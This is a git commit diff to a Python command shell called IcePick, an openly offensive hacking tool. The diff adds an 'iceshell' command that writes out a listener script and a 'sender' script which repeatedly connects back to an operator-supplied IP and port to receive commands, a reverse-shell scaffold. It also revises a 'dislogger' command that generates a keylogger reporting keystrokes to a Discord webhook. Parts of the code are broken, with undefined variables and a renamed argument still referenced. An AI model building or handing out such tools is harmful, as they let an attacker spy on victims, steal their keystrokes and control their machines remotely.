9ad37996c13dbdb840870decca50efaca5ac02ef
byestumpy <69059018+byestumpy@users.noreply.github.com>
2023-06-09 13:29:45 -0700

    Update def_core_icepick.py

--- def_core_icepick.py
+++ def_core_icepick.py
@@ -1,24 +1,130 @@
-import cmd
 import os
+import cmd
+import sys
 import ping3
-import psutil
 import argparse
 import textwrap
-import subprocess
-from discord_webhook import DiscordWebhook
-from icepick_opt import scan
 from colors import *
+from icepick_opt import scan
+from discord_webhook import DiscordWebhook
 
 
 class IcePick(cmd.Cmd):
     def __init__(self, header):
         super().__init__()
         self.intro = "Welcome to IcePick shell! Type ? to list commands."
-        self.prompt = cyan + "IcePick: " + nc + yellow + nc
-        self.header = header
-        
-        if not os.path.exists("filegen"):
-            os.makedirs("filegen")
+        self.prompt = cyan + "\nIceShell: " + nc + yellow + nc
+    def create_listener_file(self, ip, port):
+        script = textwrap.dedent(f"""
+            import socket
+
+            HOST = '{ip}'
+            PORT = {port}
+
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.bind((HOST, PORT))
+                s.listen(1)
+                print('Listener started on {ip}:{port}')
+                conn, addr = s.accept()
+                print('Connected by', addr)
+                while True:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    print('Received:', data.decode())
+        """)
+
+        listener_file = os.path.abspath("filegen/listener.py")
+        with open(listener_file, "w") as file:
+            file.write(script)
+
+        return listener_file
+
+    def create_sender_file(self, ip, port):
+        script = textwrap.dedent(f"""
+import socket
+
+
+
+while True:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((HOST, PORT))
+            print(f"Connected to {ip}:{port}")
+
+            while True:
+                command = s.recv(1024).decode()
+                if not command:
+                    break
+
+                # Add your code here to execute the received command
+                # and send the response back to the sender PC
+
+                response = "Command executed successfully"
+                s.sendall(response.encode())
+
+        except ConnectionRefusedError:
+            print(f"Connection to {ip}:{port} refused. Retrying...")
+        except Exception as e:
+            print("An error occurred:", str(e))
+
+
+    time.sleep(5)
+
+        """)
+
+        sender_file = os.path.abspath("filegen/sender.py")
+        with open(sender_file, "w") as file:
+            file.write(script)
+
+        return sender_file
+
+
+    def do_iceshell(self, args):
+        """iceshell command: Create listener or sender file."""
+        try:
+            parser = argparse.ArgumentParser(prog="iceshell", description="Create listener or sender file")
+            parser.add_argument("-c", "--create", action="store_true", help="Create file")
+            parser.add_argument("-l", "--listener", action="store_true", help="Create listener file")
+            parser.add_argument("-s", "--sender", action="store_true", help="Create sender file")
+            parser.add_argument("-ip", "--ip", help="IP address")
+            parser.add_argument("-p", "--port", type=int, help="Port number")
+            parser.add_argument("-L", "--location", action="store_true", help="Show location of files")
+            parsed_args = parser.parse_args(args.split())
+
+            if parsed_args.create:
+                if parsed_args.listener:
+                    if parsed_args.ip and parsed_args.port:
+                        listener_file = self.create_listener_file(parsed_args.ip, parsed_args.port)
+                        print(bcyan + f"Listener file created at: " + nc + byellow + listener_file + nc)
+                    else:
+                        print(bred + "Please provide IP address and port number for the listener file." + nc)
+                elif parsed_args.sender:
+                    if parsed_args.ip and parsed_args.port:
+                        sender_file = self.create_sender_file(parsed_args.ip, parsed_args.port)
+                        print(bcyan + f"Sender file created at: " + nc + byellow + sender_file + nc)
+                    else:
+                        print(bred + "Please provide IP address and port number for the sender file." + nc)
+            elif parsed_args.location:
+                listener_file = os.path.abspath("filegen/listener.py")
+                sender_file = os.path.abspath("filegen/sender.py")
+
+                if os.path.exists(listener_file):
+                    print(bcyan + f"Location of listener file: " + nc + byellow + listener_file + nc)
+                else:
+                    print(bred + "Listener file does not exist." + nc)
+
+                if os.path.exists(sender_file):
+                    print(bcyan + f"Location of sender file: " + nc + byellow + sender_file + nc)
+                else:
+                    print(bred + "Sender file does not exist." + nc)
+            else:
+                parser.print_help()
+
+        except SystemExit:
+            pass
+        except Exception as e:
+            print("Error occurred:", str(e))
 
     def do_ping(self, args):
         """ping command: Perform a custom ping command."""
@@ -103,26 +209,35 @@ class IcePick(cmd.Cmd):
         """dislogger command: Create a keylogger script with Discord webhook URL."""
         try:
             parser = argparse.ArgumentParser(prog="dislogger", description="Create the logger.py file.")
-            parser.add_argument("-w", "--webhook", help="Discord webhook URL.")
-            parser.add_argument("-l", "--locate", action="store_true", help="Print the location of the logger.py file.")
+            parser.add_argument("-w", "--webhook", help="Discord webhook URL.", required=False)
+            parser.add_argument("-L", "--location", action="store_true", help="Print the location of the logger.py file.", required=False)
             parsed_args = parser.parse_args(args.split())
 
-            webhook_url = parsed_args.webhook
-            logger_file = self.create_log(webhook_url)
+            if not parsed_args.webhook and not parsed_args.locate:
+                print(bred + "Please provide a valid argument. \nUse the following for more information: " + nc + byellow + "dislogger --help" + nc)
+                return
 
             if parsed_args.locate:
-                print("Location:", logger_file)
+                logger_file = os.path.abspath("filegen/logger.py")
+                if os.path.exists(logger_file):
+                    print(bcyan + "Location: " + nc + byellow + logger_file + nc)
+                else:
+                    print(bred + "The logger file does not exist. Create one using: " + nc + byellow + "dislogger -w [YOUR WEBHOOK URL]" + nc)
+            else:
+                webhook_url = parsed_args.webhook
+                logger_file = self.create_log(webhook_url)
 
         except SystemExit:
             pass
         except Exception as e:
             print("Error occurred:", str(e))
 
+
+
     def do_exit(self, arg):
         """exit command: Exit IcePick shell."""
         os.system('cls' if os.name == 'nt' else 'clear')
-        self.header()
-        return True
+        raise SystemExit
     
     def postcmd(self, stop, line):
         if line.strip() == "exit":
@@ -136,6 +251,10 @@ class IcePick(cmd.Cmd):
                 break
             except KeyboardInterrupt:
                 print("KeyboardInterrupt")
+            except SystemExit:
+                print("Exiting IcePick shell.")
+                os.system('cls')
+                sys.exit()
     def log_key(self, key):
         with open("key_log.txt", "a") as f:
             f.write(str(key))
